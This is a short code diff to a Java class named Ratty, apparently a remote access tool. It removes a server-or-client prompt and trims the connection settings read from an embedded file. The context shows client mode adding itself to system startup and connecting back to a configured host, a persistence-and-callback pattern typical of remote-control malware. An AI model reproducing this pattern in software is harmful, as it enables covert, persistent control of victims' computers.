@@ -5,8 +5,6 @@ import java.io.IOException;
 import java.net.URI;
 import java.net.URISyntaxException;
 
-import javax.swing.JOptionPane;
-
 import com.alee.laf.WebLookAndFeel;
 
 import de.sogomn.engine.util.FileUtils;
@@ -39,9 +37,9 @@ public final class Ratty {
 		final String[] lines = FileUtils.readInternalLines(CONNECTION_DATA_FILE_NAME);
 		
 		if (lines.length >= 3) {
-			final String addressString = lines[0];
-			final String portString = lines[1];
-			final String clientString = lines[2];
+			final String addressString = lines[0].trim();
+			final String portString = lines[1].trim();
+			final String clientString = lines[2].trim();
 			
 			address = addressString;
 			port = Integer.parseInt(portString);
@@ -101,16 +99,7 @@ public final class Ratty {
 			addToStartup();
 			connectToHost(address, port);
 		} else {
-			final String[] options = {"Server", "Client"};
-			final int input = JOptionPane.showOptionDialog(null, "Server or client?", null, JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE, null, options, null);
-			
-			if (input == JOptionPane.YES_OPTION) {
-				System.out.println("Server");
-				
-				startServer(port);
-			} else if (input == JOptionPane.NO_OPTION) {
-				connectToHost(address, port);
-			}
+			startServer(port);
 		}
 	}
 	
